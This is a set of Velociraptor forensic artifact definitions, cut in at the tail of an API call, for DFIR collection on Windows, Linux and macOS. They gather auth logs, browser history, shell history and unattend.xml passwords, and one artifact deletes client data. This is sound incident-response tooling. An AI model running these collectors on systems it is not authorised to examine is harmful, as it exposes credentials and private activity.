            url='https://api.anthropic.com/v1/messages',
            headers=dict(
                    `x-api-key`=Creds, 
                    `Content-Type`="application/json", 
                    `anthropic-version`=AnthropicVersion
                ),
            method="POST",
            data=Data )

---END OF FILE---

======
FILE: /content/exchange/artifacts/ISEAutoSave.yaml
======
name: Windows.System.Powershell.ISEAutoSave
description: |
   This artifact hunts for Powershell ISE autosave files and extracts ISE user 
   config.
   
   Powershell ISE generates auto-save files for if the editor crashes.  
   user.config holds ISE session metadata including a MRU for the relevant user.  
   
type: CLIENT

parameters:
  - name: AutoSaveFiles
    default: C:\Users\*\AppData\*\Microsoft_Corporation\Powershell_ISE.exe*\*\AutoSaveFiles\*.ps1
    description: ISE Autosave file glob
  - name: UserConfig
    default: C:\Users\*\AppData\*\Microsoft_Corporation\Powershell_ISE.exe*\*\user.config
    description: ISE user config file glob
  - name: ContentRegex
    default: .
    description: Content regex to hunt for in ISEAutoSave files
  - name: ContentWhitelist
    default:
    description: Content whitelist to exclude from results in ISEAutoSave files
     

sources:
  - precondition: SELECT OS From info() where OS = 'windows'
    query: |
      LET files = SELECT OSPath, Size, Mtime, Btime, Ctime, Atime
        FROM glob(globs=AutoSaveFiles)
        
      SELECT 
        OSPath, Size, Mtime, Btime, Ctime, Atime,
        read_file(filename=OSPath) as Content
      FROM foreach(row=files)
      WHERE Content =~ ContentRegex
        AND NOT if(condition=ContentWhitelist,
                then= Content =~ ContentWhitelist,
                else= False )


  - name: UserConfig
    query: |
      LET files = SELECT OSPath, Size, Mtime, Btime, Ctime, Atime
        FROM glob(globs=UserConfig)
      
      SELECT 
        OSPath, Size, Mtime, Btime, Ctime, Atime,
        parse_xml(file=Data,accessor='data').configuration.userSettings.UserSettings.setting[5].value.ArrayOfString.string as MRU,
        parse_xml(file=Data,accessor='data').configuration as Configuration,
        Data as RawXml
      FROM foreach(row=files, query={
            SELECT *, OSPath, Size, Mtime, Btime, Ctime, Atime 
            FROM read_file(filenames=OSPath)
            WHERE OSPath =~ 'user.config$'
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.SysLogs.yaml
======
name: Linux.Collection.SysLogs
author: alternate
description: |
  Collect system logs and upload them.
  Based on TriageSystemLogs from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: DebianPackagesLogFiles
  default: |
    ["/var/log/dpkg.log*","/var/log/apt/history.log*","/var/log/apt/term.log"]

- name: LinuxAuditLogs
  default: /var/log/audit/*

- name: LinuxAuthLogs
  default: |
    ["/var/log/auth.log*","/var/log/secure.log*"]

- name: LinuxCronLogs
  default: /var/log/cron.log*

- name: LinuxDaemonLogFiles
  default: /var/log/daemon.log* 

- name: LinuxKernelLogFiles
  default: /var/log/kern.log*

- name: LinuxLatlogFiles
  default: /var/log/lastlog

- name: LinuxMessagesLogFiles
  default: /var/log/messages*

- name: LinuxSudoReplayLogs
  default: /var/log/sudo-io/**

- name: LinuxSysLogFiles
  default: /var/log/syslog.log* 

- name: LinuxSystemdJournalLogs
  default: |
    ["/var/log/journal/*/*.journal","/var/log/journal/*/*.journal~"]

- name: LinuxUtmpFiles
  default: |
    ["/var/log/btmp","/var/log/wtmp","/var/run/utmp"]

- name: LinuxWtmp
  default: /var/log/wtmp

- name: SambaLogFiles
  default: /var/log/samba/*.log

- name: UFWLogFile
  default: /var/log/ufw.log

- name: UnixUtmpFile
  default: |
    ["/var/log/btmp","/var/log/wtmp","/var/run/utmp"]

sources:
- name: uploadDebianPackagesLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=DebianPackagesLogFiles))

- name: uploadLinuxAuditLogs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxAuditLogs)

- name: uploadLinuxAuthLogs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxAuthLogs))

- name: uploadLinuxCronLogs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxCronLogs)

- name: uploadLinuxDaemonLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxDaemonLogFiles)

- name: uploadLinuxKernelLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxKernelLogFiles)

- name: uploadLinuxLatlogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxLatlogFiles)

- name: uploadLinuxMessagesLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxMessagesLogFiles)

- name: uploadLinuxSudoReplayLogs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxSudoReplayLogs)

- name: uploadLinuxSysLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LinuxSysLogFiles)

- name: uploadLinuxSystemdJournalLogs
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxSystemdJournalLogs))

- name: uploadLinuxUtmpFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=LinuxUtmpFiles))

- name: uploadLinuxWtmp
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=LinuxWtmp)

- name: uploadSambaLogFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=SambaLogFiles)

- name: uploadUFWLogFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM stat(filename=UFWLogFile)

- name: uploadUnixUtmpFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=UnixUtmpFile))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.BrowserHistory.yaml
======
name: Linux.Collection.BrowserHistory
author: alternate
description: |
  Collect Browser History and upload them.
  Based on TriageWebBrowserHistory from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml
  
precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: ChromiumBasedBrowsersHistory
  default: |
    ["/{root,home/*}/.config/chromium/*/Archived History", 
     "/{root,home/*}/snap/chromium/common/chromium/*/History-journal", 
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/History",
     "/{root,home/*}/snap/chromium/common/chromium/*/Archived History",
     "/{root,home/*}/.config/opera/*/Archived History",
     "/{root,home/*}/.config/BraveSoftware/Brave-Browser/*/Archived History-journal",
     "/{root,home/*}/.config/chromium/*/Archived History-journal",
     "/{root,home/*}/snap/chromium/common/chromium/*/Archived History-journal",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Archived History",
     "/{root,home/*}/.config/opera/*/Archived History-journal",
     "/{root,home/*}/.config/yandex-browser-beta/*/Archived History",
     "/{root,home/*}/snap/chromium/common/chromium/*/History", 
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/History-journal",
     "/{root,home/*}/.config/BraveSoftware/Brave-Browser/*/History",
     "/{root,home/*}/.config/BraveSoftware/Brave-Browser/*/Archived History",
     "/{root,home/*}/.config/opera/*/History",
     "/{root,home/*}/.config/opera/*/History-journal",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Archived History-journal",
     "/{root,home/*}/.config/google-chrome-beta/*/Archived History",
     "/{root,home/*}/.config/google-chrome-beta/*/History",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Archived History",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/History",
     "/{root,home/*}/.config/google-chrome/*/Archived History-journal",
     "/{root,home/*}/.config/google-chrome/*/History",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/History-journal",
     "/{root,home/*}/.config/google-chrome/*/History-journal",
     "/{root,home/*}/.config/yandex-browser-beta/*/Archived History-journal",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Archived History-journal",
     "/{root,home/*}/.config/google-chrome/*/Archived History",
     "/{root,home/*}/.config/google-chrome-beta/*/History-journal",
     "/{root,home/*}/.config/google-chrome-beta/*/Archived History-journal",
     "/{root,home/*}/.config/yandex-browser-beta/*/History",
     "/{root,home/*}/.config/chromium/*/History",
     "/{root,home/*}/.config/yandex-browser-beta/*/History-journal",
     "/{root,home/*}/.config/BraveSoftware/Brave-Browser/*/History-journal",
     "/{root,home/*}/.config/chromium/*/History-journal"]

- name: FirefoxHistory
  default: |
    ["/{root,home/*}/.mozilla/firefox/*/places.sqlite-wal",
     "/{root,home/*}/.mozilla/firefox/*/places.sqlite"]

- name: OperaHistoryFile
  default: |
    ["/{root,home/*}/.opera/global_history.dat"]

sources:
- name: uploadChromiumBasedBrowsersHistory
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ChromiumBasedBrowsersHistory))

- name: uploadFirefoxHistory
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=FirefoxHistory))

- name: uploadOperaHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=OperaHistoryFile))

---END OF FILE---

======
FILE: /content/exchange/artifacts/CyberChefServer.yaml
======
name: Server.Analysis.CyberChefServer
author: Wes Lambert -- @therealwlambert
description: |
  Analyze/transform data with CyberChef-server.

  Note that this requires an accessible Cyberchef-server instance to
  work.

  If you prefer not to run a local instance, you might consider
  altering the artifact to leverage something like
  https://prod.apifor.io.

  **Reference**: https://github.com/gchq/CyberChef-server

  **Examples**:

    This artifact can be called from within another artifact to
    analyze/transform the data made available by that artifact.

    `SELECT * from Artifact.Exchange.Analysis.CyberchefServer(Input=$YOURDATA,Recipe=$YOURRECIPE)`

    If a default recipe is used, only the input will need to be passed, like so:

    `SELECT * from Artifact.Exchange.Analysis.CyberchefServer(Input=$YOURDATA)`


    The server metadata store can be used to store the URL of
    Cyberchef-server (with a key value of `CyberChefServerURL`).

    Examples of recipes can be found here:

    https://github.com/mattnotmax/cyberchef-recipes

type: server

parameters:
    - name: Url
      description: URL of CyberChef-server
      default: https://mycyberchefserver
    - name: Input
      type: string
      default:
      description: The data to send to Cyberchef-server.
    - name: Recipe
      type: string
      description: CyberChef recipe to use for processing data.
      default:
    - name: DisableSSLVerify
      type: bool
      default: True

sources:
  - queries:
    - |
        LET CCS_Url = if(
                  condition=Url,
                  then=Url,
                  else=server_metadata().CyberChefServerURL)
    - |
        LET BakedData = SELECT parse_json(data=Content).value AS TransformedValue from http_client(url=CCS_Url + "/bake", method='POST', headers=dict(`Content-Type`='application/json'), data=dict(`input`=Input, `recipe`=parse_json_array(data=Recipe)), disable_ssl_security=DisableSSLVerify)
    - |
        SELECT * FROM BakedData

---END OF FILE---

======
FILE: /content/exchange/artifacts/CVE_2021_40444.yaml
======
name: Windows.Registry.CVE_2021_40444
author: Matt Green - @mgreen27
description: |
    This artifact will enable both application and removal of the
    reccomended mitigation for CVE-2021-40444.

    Disabling the installation of all ActiveX controls in Internet
    Explorer mitigates this attack. This can be accomplished for all
    sites by updating the registry. Previously-installed ActiveX
    controls will continue to run, but do not expose this
    vulnerability.

    To disable installing ActiveX controls in Internet Explorer in all
    zones

    ```
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]
    "1001"=dword:00000003
    "1004"=dword:00000003

    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]
    "1001"=dword:00000003
    "1004"=dword:00000003

    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
    "1001"=dword:00000003
    "1004"=dword:00000003

    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]
    "1001"=dword:00000003
    "1004"=dword:00000003
    ```

    This sets the `URLACTION_DOWNLOAD_SIGNED_ACTIVEX` (0x1001) and
    `URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX` (0x1004) to `DISABLED` (3) for all
    internet zones for 64-bit and 32-bit processes. New ActiveX controls will
    not be installed. Previously-installed ActiveX controls will continue to run.

    **NOTE**: if both AddMitigation and DeleteMitigation is selected
    DeleteMitigation will take preference. Reboot may be required.

reference:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444

type: CLIENT

precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: SearchRegistryGlob
    default: HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/{0,1,2,3}/*
  - name: AddMitigation
    type: bool
    description: Add registry key mitigations for CVE-2021-40444.
  - name: DeleteMitigation
    type: bool
    description: Remove registry key mitigations for CVE-2021-40444.

sources:
  - query: |
        -- set registry values
        LET setvalues = SELECT
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/0/1001/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/0/1004/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/1/1001/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/1/1004/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/2/1001/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/2/1004/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/3/1001/',
                type='DWORD',value=3,create='Y'),
            reg_set_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/3/1004/',
                type='DWORD',value=3,create='Y')
        FROM scope()

        LET rmvalues = SELECT
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/0/1001/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/0/1004/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/1/1001/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/1/1004/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/2/1001/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/2/1004/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/3/1001/'),
            reg_rm_value(path='HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/3/1004/')
        FROM scope()

        LET values <= SELECT *
            FROM if(condition=DeleteMitigation,
                then= rmvalues,
                else=if(condition=AddMitigation,
                    then=setvalues))

        -- output rows add some description on applied settings.
        SELECT
            timestamp(string=Mtime) as ModifiedTime,
            FullPath as KeyPath,
            Data.value as Value,
            if(condition= FullPath=~'1001$',
                then='URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) - mitigation to DISABLED (3)',
                else= if(condition= FullPath=~'1004$',
                    then='URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) - mitigation to DISABLED (3)',
                    else= 'UNKNOWN')) as Description
        FROM glob(globs=SearchRegistryGlob, accessor='registry')
        WHERE Data.type = 'DWORD'

---END OF FILE---

======
FILE: /content/exchange/artifacts/UnattendXML.yaml
======
name: Windows.Detection.UnattendXML
author: Matt Green - @mgreen27
description: |
   This artifact will find unscrubbed passwords in unattend.xml answer files. This 
   file is used for non interactive Windows installation.

reference:
   - https://twitter.com/malmoeb/status/1561443455095771136
   - https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11

parameters:
   - name: TargetFileName
     default: ^(unattend\.xml|autounattend\.xml|sysprep\.xml)$
     type: regex
     description: File names to target for unattend xml files.
   - name: ExcludeString
     default: ^\*SENSITIVE\*DATA\*DELETED\*$
     description: regex to exclude
   - name: UploadHits
     description: select to upload file
     type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' 

    query: |
      LET targets = SELECT OSPath,FileName,LastModified0x10,Created0x10 FROM Artifact.Windows.NTFS.MFT(FileRegex=TargetFileName)

      LET hits = SELECT * FROM foreach(row=targets,
        query={
          SELECT 
            Type,Value,OSPath,
            LastModified0x10 as ModificationTime,
            Created0x10 as CreationTime,
            parse_xml(file=OSPath).unattend as Xml
          FROM  parse_records_with_regex(file=OSPath,regex='\\<(?P<Type>.*Password.*)\\>(?P<Value>[^<]+)\\</.*Password.*\\>')
          WHERE NOT Value =~ ExcludeString      
        })

      LET upload_hits = SELECT *, upload(file=OSPath) as Upload FROM hits
        
      SELECT * FROM if(condition=UploadHits,
        then= upload_hits,
        else= hits )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Forensics.RecentlyUsed.yaml
======
name: Linux.Forensics.RecentlyUsed
description: |
  Parses the 'recently-used.xbel' XML file for all standard Linux users.
  
  This file notably records a list of recent files accessed by applications and is also an alternative source for download history.

author: Deepak Sharma - @rxurien

type: CLIENT

precondition: SELECT OS From info() where OS = 'linux'

parameters:
  - name: RecentsFile
    default: '.local/share/recently-used.xbel'
    
sources:
  - name: Recent Entries
    query: |
        LET ParseBookmarks = SELECT * from foreach(
          row={
             SELECT Uid, User, Homedir from Artifact.Linux.Sys.Users()
          },
          query={
             SELECT FullPath, Mtime, Ctime, User, Uid
             FROM glob(
               globs=RecentsFile,
               root=Homedir)
          })

        SELECT * from foreach(
          row=ParseBookmarks,
          query={
            SELECT 
                User,
                Uid as UID,
                _value.Attrhref as FilePath,
                _value.Attradded as TimeAdded,
                _value.Attrmodified as TimeModified,
                _value.Attrvisited as TimeVisited,
                _value.info.metadata.`mime-type`.Attrtype as MimeType,
                _value.info.metadata.applications.application.Attrname as ApplicationName,
                _value.info.metadata.applications.application.Attrexec as ApplicationExec,
                _value.info.metadata.applications.application.Attrmodified as ApplicationModTime,
                _value.info.metadata.applications.application.Attrcount as ApplicationCount,
                FullPath as SourceFile
            FROM items(item=parse_xml(file=FullPath).xbel.bookmark)
          })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.MalwareBazaar.yaml
======
name: Server.Enrichment.MalwareBazaar
description: |
   Query MalwareBazaar for a hash.
   
   To learn more about MalwareBazaar, see: https://bazaar.abuse.ch/
   
   This artifact can be called from within another artifact to enrich the data made available by that artifact.

     Ex.

       `SELECT * from Artifact.Server.Enrichment.MalwareBazaar(Hash=$YourMD5OrSHA1OrSHA256)`

     If querying for an alternate hash, specify the hash type, like so:
  
       `SELECT * from Artifact.Server.Enrichment.MalwareBazaar(Hash=$YOURHASH, HashType=$YourGimphashOrImphash)`

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: SERVER

parameters:
   - name: Hash
     default:
   - name: HashType
     default:
     type: choices
     choices:
      - 
      - MD5
      - SHA1
      - SHA256
      - Gimphash
      - Imphash

sources:
    - query: |
       LET QueryTable <= SELECT * FROM parse_csv(accessor="data", filename='''
        Type,Query,SearchValue
        Gimphash,get_gimphash,gimphash
        Imphash,get_imphash,imphash
        MD5,get_info,hash
        SHA1,get_info,hash
        SHA256,get_info,hash
        Telfhash,get_telfhash,telfhash
        TLSH,get_tlsh,tlsh
       '''
       )
     
       LET MBURL <= "https://mb-api.abuse.ch/api/v1/"
       LET QueryName = SELECT Query FROM QueryTable WHERE HashType=Type
       LET SearchName = SELECT SearchValue FROM QueryTable WHERE HashType=Type
       LET Boundary <= "-----------------------------9051914041544843365972754266"
       LET Data(Name, Value) = format(
        format='--%s\nContent-Disposition: form-data; name="%v"\n\n%s\n',
        args=[Boundary, Name, Value])
       LET END = format(format="--%s--\n", args=Boundary)
 
       LET MBSubmission = SELECT 
        parse_json(data=Content).data.file_name[0] as `Filename`,
        parse_json(data=Content).data.first_seen[0] as `First Seen`,
        parse_json(data=Content).data.last_seen[0] as `Last Seen`,
        parse_json(data=Content).data.reporter[0] as Reporter,
        parse_json(data=Content).data.tags[0] as Tags,
        parse_json(data=Content).data.intelligence[0] as Intelligence,
        parse_json(data=Content) AS _Content
       FROM http_client(
         method="POST",
         url=MBURL,
         headers=dict(`Content-Type`="multipart/form-data; boundary=" + Boundary),
         data=Data(Name="query", Value=if(condition=QueryName.Query[0], then=QueryName.Query[0], else="get_info")) + Data(Name=if(condition=SearchName.SearchValue[0], then=SearchName.SearchValue[0], else="hash"), Value=Hash) + END)
       SELECT * FROM MBSubmission

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.KnowledgeC.yaml
======
name: MacOS.Applications.KnowledgeC
description: |
   On macOS, the KnowledgeC DB can provide various details around application activities and usage, as well as device power status.
   
   More information about this database can be found here: 
   
   https://www.mac4n6.com/blog/2018/8/5/knowledge-is-power-using-the-knowledgecdb-database-on-macos-and-ios-to-determine-precise-user-and-application-usage

reference:
  - https://www.mac4n6.com/blog/2018/8/5/knowledge-is-power-using-the-knowledgecdb-database-on-macos-and-ios-to-determine-precise-user-and-application-usage

type: CLIENT

author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

parameters:
- name: KCDBGlob
  default: /private/var/db/CoreDuet/Knowledge/knowledgeC.db,/Library/Application Support/Knowledge/knowledgeC.db

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - name: Application Activities
    query: |
      LET KCDBList = SELECT OSPath
       FROM glob(globs=split(string=KCDBGlob, sep=","))

      LET KCDBAppActivities = SELECT *
       FROM sqlite(file=OSPath, query='''
        SELECT
            datetime(ZOBJECT.ZCREATIONDATE+978307200,'UNIXEPOCH', 'LOCALTIME') as "ENTRY CREATION", 
            ZOBJECT.ZSECONDSFROMGMT/3600 AS "GMT OFFSET",
            CASE ZOBJECT.ZSTARTDAYOFWEEK 
                WHEN "1" THEN "Sunday"
                WHEN "2" THEN "Monday"
                WHEN "3" THEN "Tuesday"
                WHEN "4" THEN "Wednesday"
                WHEN "5" THEN "Thursday"
                WHEN "6" THEN "Friday"
                WHEN "7" THEN "Saturday"
            END "DAY OF WEEK",
            datetime(ZOBJECT.ZSTARTDATE+978307200,'UNIXEPOCH', 'LOCALTIME') as "START", 
            datetime(ZOBJECT.ZENDDATE+978307200,'UNIXEPOCH', 'LOCALTIME') as "END", 
            (ZOBJECT.ZENDDATE-ZOBJECT.ZSTARTDATE) as "USAGE IN SECONDS", 
            ZOBJECT.ZSTREAMNAME, 
            ZOBJECT.ZVALUESTRING,
            ZSTRUCTUREDMETADATA.Z_DKAPPLICATIONACTIVITYMETADATAKEY__ACTIVITYTYPE AS "ACTIVITY TYPE",  
            ZSTRUCTUREDMETADATA.Z_DKAPPLICATIONACTIVITYMETADATAKEY__TITLE as "TITLE", 
            ZSTRUCTUREDMETADATA.Z_DKAPPLICATIONACTIVITYMETADATAKEY__USERACTIVITYREQUIREDSTRING as "ACTIVITY STRING",
            datetime(ZSTRUCTUREDMETADATA.Z_DKAPPLICATIONACTIVITYMETADATAKEY__EXPIRATIONDATE+978307200,'UNIXEPOCH', 'LOCALTIME') as "EXPIRATION DATE"
        FROM ZOBJECT
        left join ZSTRUCTUREDMETADATA on ZOBJECT.ZSTRUCTUREDMETADATA = ZSTRUCTUREDMETADATA.Z_PK
        WHERE ZSTREAMNAME is "/app/activity" or ZSTREAMNAME is "/app/inFocus"''')
  
      SELECT timestamp(string=`ENTRY CREATION`) AS Timestamp,	
        `GMT OFFSET` AS OffsetGMT,	
        `DAY OF WEEK` AS DayOfWeek,	
        `START` AS Start,
        `END` AS End,
        `USAGE IN SECONDS` AS Usage,	
        ZSTREAMNAME AS StreamName,
        ZVALUESTRING AS StreamValue,	
        `ACTIVITY TYPE` AS ActivityType, 	
        TITLE AS Title,
        `ACTIVITY STRING` AS Activity,	
        `EXPIRATION DATE` AS ExpirationDate
      FROM foreach(row=KCDBList,query=KCDBAppActivities)

---END OF FILE---

======
FILE: /content/exchange/artifacts/DeleteClientLabel.yaml
======
name: Server.Utils.DeleteClientLabel
author: Matt Green - @mgreen27
description: |
  This artifact completely removes a client from the data store if a configured
  label is set.

  We reccomend running as a server artifact then if happy with actions add as an
  action for monitoring.

  Be careful with this one: there is no way to recover old
  data. However, if the client still exists, it will just
  automatically re-enroll when it next connects. You will still be able
  to talk to it, it is just that old collected data is deleted.

type: SERVER

parameters:
  - name: LabelToDelete
    description: A label to delete the client if applied to machine.
    default: todelete
  - name: ReallyDoIt
    description: If you really want to delete the client, check this.
    type: bool

sources:
  - query: |
        LET to_remove = SELECT
            client_id AS ClientId,
            os_info.hostname as Hostname,
            timestamp(epoch=first_seen_at) AS FirstSeen,
            timestamp(epoch=last_seen_at) AS LastSeen,
            agent_information.version AS AgentVersion,
            agent_information.build_time AS AgentBuildTime,
            os_info.release as OS,
            os_info.machine as Architecture,
            os_info.fqdn as Fqdn,
            last_ip AS LastIp,
            labels,
            os_info.mac_addresses as mac_addresses
        FROM clients()
        WHERE LabelToDelete IN labels

        LET deleted_files <= SELECT *
            FROM client_delete(client_id=to_remove.ClientId, really_do_it=ReallyDoIt)

        SELECT *,
            {
                SELECT vfs_path
                FROM deleted_files
                WHERE client_id = ClientId
            } AS DeletedFiles,
            {
                SELECT type
                FROM deleted_files
                WHERE client_id = ClientId
                GROUP BY type
            } AS DeletedFileType,
            {
                SELECT really_do_it
                FROM deleted_files
                WHERE client_id = ClientId
                GROUP BY really_do_it
            } AS really_do_it
        FROM to_remove

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Sys.BashHistory.yaml
======
name: MacOS.Sys.BashHistory
author: Wes Lambert - @therealwlambert
description: |
  This artifact is a modified version of the Linux.Sys.BashHistory artifact that enables grep of Bash and alternate shell history and *session* files.

  Session files can be helpful in determining an approximate timeframe in which certain commands were run (the session start/end time), as traditional history files do not provide this information. 
  
  http://www.swiftforensics.com/2018/05/bash-sessions-in-macos.html

  This artifact can also be used to target other files located in the user profile such as
  *_profile and *rc files.
  shell history: /{root,home/*}/.*_history
  profile: /{root,home/*}/.*_profile
  *rc file: /{root,home/*}/.*rc

  tags: .bash_history .bash_profile .bashrc

reference:
  - http://www.swiftforensics.com/2018/05/bash-sessions-in-macos.html

parameters:
  - name: HistoryGlob
    default: /Users/*/.*_history
  - name: SessionsGlob
    default: /Users/*/.{bash,zsh}_sessions/*.history
  - name: SearchRegex
    type: regex
    description: "Regex of strings to search in line."
    default: '.'
  - name: WhitelistRegex
    type: regex
    description: "Regex of strings to leave out of output."
    default:

sources:
  - name: History
    query: |
      SELECT * FROM Artifact.Linux.Sys.BashHistory(TargetGlob=HistoryGlob,SearchRegex=SearchRegex,WhitelistRegex=WhitelistRegex)
          
  - name: Sessions
    query: |
      LET files = SELECT FullPath, Btime FROM glob(globs=SessionsGlob)
      SELECT * FROM foreach(row=files,
        query={
          SELECT Line,
            {SELECT Btime FROM glob(globs=FullPath + 'new')} AS SessionStarted, 
            Btime AS SessionEnded,
            timestamp(
              string=grok(
                data=read_file(
                  filename=split(
                    string=FullPath, 
                    sep='''\.history''')[0] + '.session'), grok='''echo Restored session: "\$\(/bin/date -r %{DATA:date}\)"''').date) AS SessionResumed,
            FullPath 
          FROM parse_lines(filename=FullPath)
          WHERE Line =~ SearchRegex 
          AND NOT if(condition= WhitelistRegex, then= Line =~ WhitelistRegex, else= FALSE)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.Recall.WindowCaptureEvent.yaml
======
name: Windows.System.Recall.WindowCaptureEvent
author: |
  Zach Stanford @svch0st
description: |
   This artefact will read and correlate several tables to do with Microsoft Recall.
   
   The main database is held here:
      C:\Users\\*\AppData\Local\CoreAIPlatform.00\UKP\{DA73A0DB-DDF4-4A81-9506-CCB5DE8B0F14}\ukg.db
        
   With the images stored:
      C:\Users\\*\AppData\Local\CoreAIPlatform.00\UKP\{DA73A0DB-DDF4-4A81-9506-CCB5DE8B0F14}\ImageStore\\*
   
   To view the snapshot images easily from the notebook output, right click and open image in a new tab. 

   
